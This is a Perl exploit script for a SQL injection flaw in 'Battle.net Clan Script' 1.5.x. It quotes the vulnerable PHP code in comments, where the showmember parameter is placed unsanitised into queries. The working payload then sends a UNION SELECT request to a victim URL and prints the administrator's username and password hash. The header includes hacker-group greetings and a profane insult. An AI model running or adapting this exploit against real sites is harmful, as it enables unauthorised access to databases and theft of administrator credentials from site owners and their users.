#!/usr/bin/perl -w
# download script : 
http://sourceforge.net/project/showfiles.php?group_id=142506&package_id=156487
##############################################################
# Battle.net Clan Script <= 1.5.x - Remote SQL Inj Exploit   #
##############################################################
########################################
#[*] Founded by : Stack-Terrorist [v40]
#[*] Contact: Ev!L
#[*] Greetz : Houssamix & All muslims HaCkeRs  :)
#[*] Fuck   : JosS :@
########################################
# vulnerable page
########################################
#<div id="header"><h1><?php echo $site_name ?></h1></div>
#<div id="gutter"></div>
#<div id="col1">
# <?php showNav(); ?>#div>
#<div id="col2">
# <?php
# if(!isset($_GET['showmember']))
# { ?>
#  <h2>Members</h2>
#  <table id="members">
#   <tr>
#    <th>Rank</th>
#    <th>Member Name</th>
#    <th>Email</th>
#    <th>Date Joined</th>
#   </tr>
#   <?php#mysql_select_db($mysql_db) or die(mysql_error());
#   $sql = 'SELECT bcs_members.id, bcs_members.name, bcs_members.email, 
bcs_members.date, bcs_ranks.`order`, bcs_ranks.name AS rank '
#    . 'FROM bcs_members, bcs_ranks WHERE bcs_members.rank = 
bcs_ranks.id ORDER BY `order`, id';
#   $alt = 0;
#   $result = mysql_query($sql)  or die(mysql_error());
#   while($r=mysql_fetch_array($result))
#   {
#    $id=$r["id"];
#    $name=$r["name"];
#    $rank=$r["rank"];
##    $email=$r["email"];
 #   $recruit=$r["recruit"];
 #   $date=$r["date"];
 #   if($recruit === '') { $recruit = '&nbsp;'; }
 #   if ($alt % 2 == 0) { echo '<tr class="altrow">' . "\n"; }
 ##   else {  echo '<tr>' . "\n"; }
  #  echo '<td>' . $rank . '</td>' . "\n";
  #  echo '<td><a href="?page=members&showmember=' . $name . '">' . 
$name . '</a></td>' . "\n";
  ##  if($email === '') { echo '<td>n/a</td>' . "\n"; }
   # else { echo '<td><a href="mailto:' . $email . '">Email</a></td>' . 
"\n"; }
   # echo '<td>' . date("F d, Y", strtotime($date)) . '</td>' . "\n";
   # echo '</tr>' . "\n";
   # $alt = $alt + 1;
   #}
   #?>
  #</table>
# <?php
 #} // end of if $_GET
 #else
 #{?>
 # <h2>Member Details</h2>
 # <table id="members">
 #  <tr>
 #   <th>Rank</th>
 #   <th>Member Name</th>
 #   <th>Email</th>
  #  <th>Date Joined</th>
  # </tr>
  # <tr>
  # <?php
  # mysql_connect($mysql_host, $mysql_user, $mysql_pass) or 
die(mysql_error());
  # mysql_select_db($mysql_db) or die(mysql_error());
  # $sql = "SELECT `bcs_members`.`name`, `bcs_members`.`email`, 
`bcs_members`.`date`, `bcs_ranks`.`name` AS 'rank'"
  #  . "FROM `bcs_members`, `bcs_ranks` WHERE `bcs_members`.`rank` = 
`bcs_ranks`.`id` AND `bcs_members`.`name` = '" . $_GET['showmember'] . 
"'";
  # $result = mysql_query($sql)  or die(mysql_error());
  # $r=mysql_fetch_array($result);
  # echo '<td>' . $r["rank"] . '</td>' . "\n";
  # echo '<td>' . $r["name"] . '</td>' . "\n";
  # if($r["email"] === '') { echo '<td>n/a</td>' . "\n"; }
  # else { echo '<td><a href="mailto:' . $r["email"] . 
'">Email</a></td>' . "\n"; }
  # echo '<td>' . date("F d, Y", strtotime($r["date"])) . '</td>' . 
"\n";
  # ?>
  # </tr>
  #</table>
  #<br/>
  #<h2>Medals</h2>
  #<table id="members">
  # <tr>
  #  <th>Medal</th>
  #  <th>Medal Name</th>
  #  <th>Description</th>
  # </tr>
  # <tr>
  # <?php
  # $alt = 0;
  # $sql = 'SELECT `bcs_medals` . `path` , `bcs_medals` . `name` , 
`bcs_medals` . `description` '
  #  . ' FROM `bcs_medals` , `bcs_members` , `bcs_medal_list` '
   # . " WHERE `bcs_members` . `name` = '" . $_GET['showmember'] . "'"
   # . ' AND `bcs_medal_list` . `mem_id` = `bcs_members` . `id` '
  #  . ' AND `bcs_medal_list` . `medal` = `bcs_medals` . `id` ';
  # $result = mysql_query($sql)  or die(mysql_error());
  # while($r=mysql_fetch_array($result))
  # {
  #  $id=$r["id"];
   # $name=$r["name"];
   # $path=$r["path"];
   # $desc=$r["description"];
   # if ($alt % 2 == 0) { echo '<tr class="altrow">' . "\n"; }
   # else {  echo '<tr>' . "\n"; }
   # echo '<td class="center"><img src="' . $path . '" alt="' . $name . 
'"/></td>' . "\n";
   # echo "<td>" . $name . "</td>\n";
   # echo "<td>" . $desc . "</td>\n";
   # echo "</tr>\n";
   # $alt = $alt + 1;
   #}?>
#   </tr>
#  </table>
# <?php
#  echo "<br/>\n";
#  echo "<h2>Recruited</h2>\n";
#  $result = mysql_query("SELECT bcs_members.name FROM bcs_members, 
(SELECT id FROM bcs_members WHERE name = '" . $_GET['showmember'] . "') 
AS results "
#   . "WHERE results.id = bcs_members.recruit")  or die(mysql_error());
#  while($r=mysql_fetch_array($result))
#  {
#   echo $r["name"] . "<br/>\n";
#  }
# }
# ?>
#</div>
#<div id="footer"><?php echo $release; ?></div>*/
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------#
system("color a");
print 
"\t\t############################################################\n\n";
print "\t\t# Battle.net Clan Script <= 1.5.x - Remote SQL Inj Exploit 
#\n\n";
print "\t\t#                 by Stack-Terrorist [v40]                 
#\n\n";
print 
"\t\t############################################################\n\n";
use LWP::UserAgent;
die "Example: perl $0 http://victim.com/\n" unless @ARGV;
system("color f");
#the username of joomla
$user="name";
#the pasword of joomla
$pass="password";
#the tables of joomla
$tab="bcs_members";
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $ARGV[0] . 
"/?page=members&showmember=-1'%20union%20select%20".$pass.",user(),44,".$user."+from+".$tab."+where+id=1/*";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content;
if ($answer =~ /<td>(.*?)<\/td>/){
        print "\nBrought to you by v4-team.com...\n";
        print "\n[+] Admin User : $1";
}
if ($answer =~/([0-9a-fA-F]{32})/){print "\n[+] Admin Hash : $1\n\n";
print "\t\t#   Exploit has ben aported user and password hash   #\n\n";}
else{print "\n[-] Exploit Failed...\n";}
# exploit exploited by Stack-Terrorist 


